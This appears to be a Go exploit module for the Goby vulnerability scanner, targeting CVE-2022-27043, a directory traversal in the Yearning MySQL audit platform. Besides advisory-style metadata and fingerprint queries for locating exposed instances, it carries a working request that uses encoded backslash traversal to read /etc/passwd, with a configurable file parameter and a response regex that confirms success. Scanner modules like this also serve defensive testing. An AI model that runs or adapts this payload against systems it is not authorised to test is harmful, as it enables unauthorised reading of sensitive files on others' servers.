package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Yearning front Api Arbitrary file reading vulnerability (CVE-2022-27043)",
    "Description": "<p>Yearning is an excellent and convenient Mysql SQL auditing platform for Henry Yee's individual developers in China.  </p><p> </p><p>Yearning 2.3.1, Interstellar 2.3.2, and Neptune 2.3.4-2.3.6 have security vulnerabilities, which are caused by a directory traversal vulnerability.  An attacker could exploit the vulnerability to gain access to sensitive information.  </p>",
    "Impact": "<p>Yearning Arbitrary file reading vulnerability</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://cxsecurity.com/cveshow/CVE-2022-27043/\">https://cxsecurity.com/cveshow/CVE-2022-27043/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "Product": "Yearning",
    "VulType": [
        "Directory Traversal"
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "Translation": {
        "CN": {
            "Name": "Yearning front 接口任意文件读取漏洞（CVE-2022-27043）",
            "Product": "Yearning",
            "Description": "<p>Yearning是中国Henry Yee个人开发者的一个出色方便快捷的 Mysql SQL 审核平台。</p><p>Yearning 2.3.1 版本、Interstellar GA 2.3.2 版本 和 Neptune 2.3.4 - 2.3.6 版本存在安全漏洞，该漏洞源于存在一个目录遍历漏洞。攻击者可以利用该漏洞获取敏感信息。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a target=\"_Blank\" href=\"https://cxsecurity.com/cveshow/CVE-2022-27043/\">https://cxsecurity.com/cveshow/CVE-2022-27043/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Yearning 2.3.1 版本、Interstellar GA 2.3.2 版本 和 Neptune 2.3.4 - 2.3.6 版本存在安全漏洞，该漏洞源于存在一个目录遍历漏洞。攻击者可以利用该漏洞获取敏感信息。</span><br></p>",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "Yearning front Api Arbitrary file reading vulnerability (CVE-2022-27043)",
            "Product": "Yearning",
            "Description": "<p>Yearning is an excellent and convenient Mysql SQL auditing platform for Henry Yee's individual developers in China. &nbsp;</p><p>&nbsp;</p><p>Yearning 2.3.1, Interstellar 2.3.2, and Neptune 2.3.4-2.3.6 have security vulnerabilities, which are caused by a directory traversal vulnerability.&nbsp;&nbsp;An attacker could exploit the vulnerability to gain access to sensitive information.&nbsp;&nbsp;</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a target=\"_Blank\" href=\"https://cxsecurity.com/cveshow/CVE-2022-27043/\">https://cxsecurity.com/cveshow/CVE-2022-27043/</a><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Yearning Arbitrary file reading vulnerability</p>",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "FofaQuery": "body=\"<head><title>Yearning</title>\"",
    "GobyQuery": "body=\"<head><title>Yearning</title>\"",
    "Author": "tangyunmingt@gmail.com",
    "Homepage": "http://yearning.io/",
    "DisclosureDate": "2022-04-20",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [
        "CVE-2022-27043"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202204-3456"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/front//%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "root:(x*?):0:0:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/front//%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "root:(x*?):0:0:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "file",
            "type": "input",
            "value": "/etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10489"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
